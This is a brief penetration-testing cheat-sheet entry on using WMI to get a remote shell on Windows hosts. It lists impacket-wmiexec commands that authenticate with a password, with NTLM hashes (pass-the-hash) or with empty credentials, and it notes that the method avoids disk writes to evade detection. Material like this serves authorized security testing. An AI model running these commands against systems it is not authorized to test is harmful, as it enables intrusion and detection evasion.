### WMI
>The advantage to this method is that it allows us to execute code without writing on the disk or creating a new system. The result is a lowered chance of detection by Windows Security Essentials and Bit9, for instance
###### Get Shell
```
impacket-wmiexec domain/username:password@ip
impacket-wmiexec -hashes LMHASH:NTHASH domain/username@ip
```

###### Connecting with authentication
```
impacket-wmiexec domain/'':''@ip
```
